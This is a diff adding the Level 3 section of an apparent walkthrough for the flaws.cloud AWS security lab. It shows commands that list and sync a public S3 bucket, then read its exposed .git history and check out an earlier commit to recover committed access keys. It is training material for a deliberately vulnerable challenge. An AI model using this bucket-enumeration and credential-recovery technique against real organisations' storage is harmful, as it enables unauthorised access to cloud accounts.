@@ -87,3 +87,48 @@ After getting the result browse the secret file and you will get the link for th
     
 ## Level 3
 
+To list the root dir files use the command:
+
+
+    $aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
+output:
+
+                                PRE .git/
+    2017-02-27 05:44:33     123637 authenticated_users.png
+    2017-02-27 05:44:34       1552 hint1.html
+    2017-02-27 05:44:34       1426 hint2.html
+    2017-02-27 05:44:35       1247 hint3.html
+    2017-02-27 05:44:33       1035 hint4.html
+    2020-05-22 23:51:10       1861 index.html
+    2017-02-27 05:44:33         26 robots.txt
+
+Here we can a see a .git file, 
+
+For accessing the git commands, we sync it with our local system using the command:
+ 
+    $ aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud ./flaws
+
+Navigate into that directory using the command:
+
+    $cd flaws
+
+After that, for finding access and secret key, we can use the command
+     
+     $git logs
+     
+output:
+
+    commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -> master)
+    Author: 0xdabbad00 <scott@summitroute.com>
+    Date:   Sun Sep 17 09:10:43 2017 -0600
+
+        Oops, accidentally added something I shouldn't have
+
+    commit f52ec03b227ea6094b04e43f475fb0126edb5a61
+    Author: 0xdabbad00 <scott@summitroute.com>
+    Date:   Sun Sep 17 09:10:07 2017 -0600
+
+        first commit
+To change branch that was mentioned in the commit, follow the command
+
+    $ git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61
